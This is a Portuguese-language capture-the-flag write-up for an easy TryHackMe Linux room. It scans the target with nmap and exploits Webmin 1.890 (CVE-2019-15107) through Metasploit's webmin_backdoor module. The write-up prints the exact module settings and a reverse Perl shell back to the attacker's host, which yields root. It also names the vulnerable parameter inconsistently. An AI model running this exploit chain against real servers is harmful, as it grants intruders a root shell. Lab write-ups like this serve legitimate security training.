---
layout: writeup
title: Source
platform: thm
difficulty: easy
os: linux
---

> **Dificuldade**: Fácil
{: .prompt-info }

> Writeup importado do Notion. Imagens originais omitidas.
{: .prompt-tip }

## Scan

```bash
nmap -sSV -Pn -v 10.10.227.208 -g 443 -D RND
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```

## Enumeração

### Webmin (porta 10000)

Webmin **1.890** — versão vulnerável a **CVE-2019-15107** (backdoor RCE no parâmetro `password` em `/password_change.cgi`).

Webmin com SSL habilitado por default na porta 10000 (HTTPS).

## Root — Metasploit

Módulo `exploit/linux/http/webmin_backdoor`:

```
msf6 > use exploit/linux/http/webmin_backdoor
msf6 exploit(linux/http/webmin_backdoor) > set rhosts 10.10.227.208
msf6 exploit(linux/http/webmin_backdoor) > set lhost tun0
msf6 exploit(linux/http/webmin_backdoor) > set ssl true   # CRÍTICO: webmin usa HTTPS
msf6 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.13.49.82:4444
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

> **Nota:** Sem flag `ssl true` o exploit falha porque o módulo tenta HTTP plain text mas o Webmin só fala HTTPS na porta 10000.
{: .prompt-warning }

## Resumo

| Etapa | Técnica |
|-------|---------|
| Recon | nmap → Webmin 1.890 na :10000 |
| Vuln | CVE-2019-15107 (backdoor injetado no source code via supply chain) |
| Exploit | metasploit `webmin_backdoor` com SSL=true |
| Resultado | Shell direto como root (Webmin roda como root) |

> **CVE-2019-15107 detalhes:** O código-fonte do Webmin foi comprometido (supply chain attack). Versões 1.882-1.921 contêm backdoor no `password_change.cgi` que permite RCE via field `old`. Patch: 1.930+.
{: .prompt-info }
